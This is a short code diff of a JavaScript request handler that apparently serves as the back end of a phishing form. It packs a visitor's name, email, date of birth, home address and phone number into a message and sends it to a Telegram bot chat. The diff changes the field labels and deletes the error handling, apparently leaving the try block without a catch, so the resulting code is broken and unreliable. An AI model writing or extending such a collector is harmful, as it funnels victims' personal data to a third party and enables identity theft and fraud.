@@ -10,11 +10,11 @@ export default async function handler(req, res) {
 
   const message = `
 📨 بيانات جديدة:
-- الاسم: ${first_name} ${last_name}
-- البريد: ${email}
-- تاريخ الميلاد: ${dob}
-- العنوان: ${address}, ${city}, ${postal}
-- رقم الهاتف: ${num}
+- nom: ${first_name} ${last_name}
+- adress: ${email}
+- date : ${dob}
+- adress: ${address}, ${city}, ${postal}
+- nummber : ${num}
   `;
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -26,9 +26,6 @@ export default async function handler(req, res) {
       body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
     });
 
-    res.status(200).json({ message: "تم الإرسال بنجاح!" });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ message: "خطأ أثناء الإرسال" });
-  }
+  } 
 }
+
